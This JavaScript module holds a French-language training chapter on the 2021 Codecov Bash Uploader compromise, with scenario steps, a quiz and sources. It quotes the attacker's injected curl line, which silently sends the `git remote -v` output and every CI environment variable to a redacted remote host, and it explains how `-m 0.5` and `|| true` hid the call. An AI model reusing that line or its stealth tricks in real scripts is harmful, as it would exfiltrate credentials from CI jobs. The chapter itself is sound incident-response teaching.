const PM = 'https://about.codecov.io/security-update/';

/** @type {import('../../../content.js').Chapter} */
export default {
	slug: 'codecov-2021',
	part: 'Sécurité',
	title: 'Codecov 2021 : un Bash Uploader modifié dans la CI des clients',
	minutes: 10,
	hook: [
		'Jeudi 1er avril 2021, le matin. Un client de Codecov signale que le Bash Uploader qu’il vient de télécharger ne correspond pas à son checksum publié.',
		'Le Bash Uploader est un script que les jobs de CI récupèrent sur https://codecov.io/bash puis exécutent, pour envoyer leurs rapports de couverture à Codecov. La GitHub Action de Codecov, l’Orb CircleCI et le Bitrise Step lancent ce même script.',
		'Le client a calculé le shasum du fichier téléchargé et l’a comparé au shasum publié sur GitHub. Les deux valeurs diffèrent.'
	],
	terms: [
		{ term: 'Bash Uploader', def: 'Le script shell de Codecov qui détecte les réglages de la CI, rassemble les rapports de couverture et les envoie à Codecov.' },
		{ term: 'checksum', def: 'Une courte valeur calculée à partir des octets d’un fichier, comme une somme SHA-256. Un seul octet modifié, et la somme change.' },
		{ term: 'curl pipe to bash', def: 'Exécuter un script directement depuis une URL, comme `curl -s https://… | bash`, sans l’enregistrer ni le vérifier avant.' },
		{ term: 'variables d’environnement de CI', def: 'Les variables avec lesquelles tourne un job de CI. Les équipes y mettent des tokens et des clés pour que le job puisse déployer ou appeler d’autres services.' }
	],
	incident: {
		org: 'Codecov',
		title: 'Bash Uploader Security Update',
		date: '2021-01-31',
		url: PM,
		steps: [
			{
				situation: [
					'Le script servi sur https://codecov.io/bash ne correspond pas au checksum que publie Codecov. Chaque job de CI qui le récupère en ce moment exécute ce que contient ce fichier.'
				],
				q: 'Que fais-tu en premier ?',
				options: [
					'Tu mets à jour le checksum publié sur GitHub pour qu’il colle au fichier servi',
					'Tu demandes au client de retélécharger, au cas où un cache aurait servi une copie abîmée',
					'Tu attends un deuxième signalement avant d’y voir plus qu’un incident isolé',
					'Tu lis le script servi, et tu le remplaces par la version saine connue'
				],
				answer: 3,
				why: 'Un écart veut dire que le fichier a changé, et chaque téléchargement exécute la copie modifiée. Codecov a vu que quelqu’un avait modifié le script : "Immediately upon becoming aware of the issue, Codecov secured and remediated the affected script".'
			},
			{
				situation: [
					'Le script servi a une ligne de plus : `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://<redacted>/upload/v2 || true`.',
					'L’attaquant a modifié le script avec une clé Google Cloud Storage (GCS). Il a extrait cette clé grâce à une erreur dans le processus de création des images Docker de Codecov.'
				],
				q: 'Quels identifiants fais-tu tourner ?',
				options: [
					'Seulement la clé GCS qui a servi à changer le script',
					'Tous les identifiants internes concernés, clé GCS comprise',
					'Aucun pour l’instant, tu passes le stockage en lecture seule',
					'Les tokens de CI du client qui a signalé le problème'
				],
				answer: 1,
				why: 'Une image qui a laissé fuir une clé a pu en laisser fuir d’autres, et personne ne sait encore ce que l’attaquant a lu. Codecov a fait tourner "all relevant internal credentials, including the key used to facilitate the modification of the Bash Uploader", et vérifié "where and how the key was accessible."'
			},
			{
				situation: [
					'L’enquête montre que l’attaquant a modifié le script à plusieurs reprises, à partir du 31 janvier 2021.',
					'Les utilisateurs qui hébergent eux-mêmes Codecov récupèrent le script sur leur propre installation, sauf si leur CI pointe vers https://codecov.io/bash.'
				],
				q: 'Quels utilisateurs sont concernés ?',
				options: [
					'Ceux qui ont récupéré https://codecov.io/bash le 1er avril, le jour de la découverte',
					'Ceux qui ont lancé le Bash Uploader ou un de ses wrappers du 31 janvier au 1er avril',
					'Ceux dont un job de CI a échoué à un moment entre le 31 janvier et le 1er avril',
					'Tous les utilisateurs de Codecov, y compris ceux qui hébergent leur propre copie'
				],
				answer: 1,
				why: 'La GitHub Action, l’Orb CircleCI et le Bitrise Step lancent le même script, donc leurs utilisateurs ont aussi exécuté la ligne ajoutée. Codecov a demandé d’agir à quiconque avait utilisé "the Bash Uploaders between January 31, 2021 and April 1, 2021" sans vérifier le checksum. La ligne ajoutée ne faisait jamais échouer un build, donc les jobs en échec ne disent rien.'
			},
			{
				situation: [
					'15 avril 2021. Codecov écrit aux utilisateurs touchés et affiche un bandeau dans l’app. Tu rédiges ce qu’ils doivent faire.'
				],
				q: 'Que dis-tu de faire aux utilisateurs touchés ?',
				options: [
					'Retirer l’étape Codecov de leur CI et la remettre quand un nouveau script sortira',
					'Figer le Bash Uploader sur une version d’avant le 31 janvier et continuer',
					'Changer leur token d’upload Codecov, puisque c’est celui que le script utilise',
					'Lancer `env` dans leur CI, et remplacer chaque secret affiché par un nouveau'
				],
				answer: 3,
				why: 'La ligne ajoutée envoyait la sortie de `env`, donc chaque variable visible par le job est exposée. Codecov : "You should immediately re-roll all of your credentials, tokens, or keys located in the environment variables in your CI process" (renouvelle tout ce qui est dans les variables d’environnement), puis vérifier l’usage de ces tokens.'
			},
			{
				situation: [
					'Le script est de nouveau propre et les clés ont tourné. Les utilisateurs récupèrent toujours ce que sert https://codecov.io/bash au moment où le job tourne. Seuls ceux qui ont ajouté leur propre vérification de checksum verraient un fichier modifié.'
				],
				q: 'Que changes-tu dans la façon de livrer l’uploader ?',
				options: [
					'Tu sers le même script depuis un second domaine, pour qu’une clé volée ne suffise pas',
					'Tu livres des versions numérotées avec des SHA256SUM signés par une clé GPG Codecov',
					'Tu ajoutes en haut du script une ligne qui affiche son propre checksum',
					'Tu gardes le script et tu demandes de le relire avant chaque run de CI'
				],
				answer: 1,
				why: 'Une signature faite avec une clé que l’attaquant n’a pas permet de rejeter un fichier modifié. Codecov a construit un nouvel uploader pour remplacer le Bash Uploader. Il garde toutes les anciennes versions, "with provided SHASUMs and GPG Signatures for content and authorship validation", et peut être figé sur une version.'
			}
		],
		outcome: [
			'Du 31 janvier au 1er avril 2021, un attaquant a modifié par moments le Bash Uploader avec une clé GCS extraite grâce à une erreur dans la création des images Docker de Codecov. Le script modifié a été servi pendant 108 fenêtres de temps, et selon Codecov la ligne `curl` ajoutée est la seule modification jamais faite.',
			'Chaque job de CI qui a lancé le script modifié a envoyé sa sortie `git remote -v` et toutes ses variables d’environnement à un serveur tiers. Cela couvre tous les identifiants, tokens ou clés du job, et tout ce qu’ils ouvrent.',
			'Codecov a ensuite obtenu un lot de variables d’environnement dont il a la preuve qu’elles ont été compromises, et a montré le détail aux utilisateurs touchés dans l’app. Il a saisi la justice et n’a pas pu déterminer qui était derrière.',
			'Codecov a fait tourner ses identifiants, vérifié où la clé était accessible, ajouté une surveillance des changements de l’uploader, et travaillé à faire fermer le serveur de l’attaquant. En juin 2021, il a sorti une bêta d’un nouvel uploader aux checksums signés et annoncé l’abandon du Bash Uploader.'
		]
	},
	quiz: [
		{
			q: 'Qu’envoyait à l’attaquant la ligne ajoutée au Bash Uploader ?',
			options: [
				'Le rapport de couverture du job, qui montre la structure du code',
				'Seulement le token d’upload Codecov dont le script a besoin',
				'La sortie de `git remote -v` et toutes les variables d’environnement du job',
				'La clé SSH privée du runner de CI, lue dans son répertoire personnel'
			],
			answer: 2,
			why: '`$(git remote -v)` donne l’URL du dépôt, et `$(env)` affiche toutes les variables du job. `curl -d` envoyait les deux au serveur de l’attaquant, donc chaque secret de l’environnement de CI partait avec.'
		},
		{
			q: 'Pourquoi la ligne ajoutée n’a-t-elle ni cassé ni ralenti les jobs de CI qui l’exécutaient ?',
			options: [
				'`-m 0.5` limitait l’appel à une demi-seconde, et `|| true` cachait toute erreur',
				'L’attaquant ne servait le script modifié qu’en dehors des heures de bureau',
				'L’appel en plus tournait en arrière-plan, une fois le job terminé',
				'Les serveurs de Codecov relayaient les données, donc le job ne faisait aucun appel'
			],
			answer: 0,
			why: 'L’option `-m` de curl fixe la durée maximale d’un transfert, et `-s` masque les erreurs. En bash, `a || b` lance `b` seulement si `a` échoue, donc `|| true` transforme un `curl` raté en succès et le build continue.'
		},
		{
			q: 'Ta CI lance un outil avec `curl -s https://… | bash`. Quel changement aurait repéré le script modifié de Codecov ?',
			options: [
				'Lancer chaque job de CI dans un conteneur neuf, pour qu’aucun état ne reste',
				'Télécharger une version figée et comparer son checksum à une valeur de confiance',
				'Ajouter `set -e` en haut de ton script de CI pour arrêter le job à la moindre erreur',
				'Ne récupérer le script qu’en HTTPS, pour que personne ne le modifie en route'
			],
			answer: 1,
			why: 'L’attaquant a modifié le fichier à la source, donc HTTPS livrait intacte la copie modifiée. C’est une comparaison de checksums qui l’a révélé : le "shasum on Github" ne collait pas avec "the shasum calculated from the downloaded Bash Uploader."'
		}
	],
	recall: {
		q: 'Qu’a ajouté l’attaquant au Bash Uploader de Codecov, et comment l’a-t-on découvert ?',
		a: 'Une ligne `curl` qui envoyait les sorties de `git remote -v` et de `env` à un serveur tiers. Un client l’a vue le 1er avril 2021, quand le shasum du script ne collait pas avec celui publié sur GitHub.'
	},
	sources: [
		{ title: 'Codecov, Bash Uploader Security Update (15 avril 2021, mis à jour le 29 avril)', url: PM },
		{ title: 'Codecov, Introducing Codecov’s New Uploader (juin 2021)', url: 'https://about.codecov.io/blog/introducing-codecovs-new-uploader/' },
		{ title: 'Page de manuel de curl : -m, --max-time et -s, --silent', url: 'https://curl.se/docs/manpage.html' }
	]
};
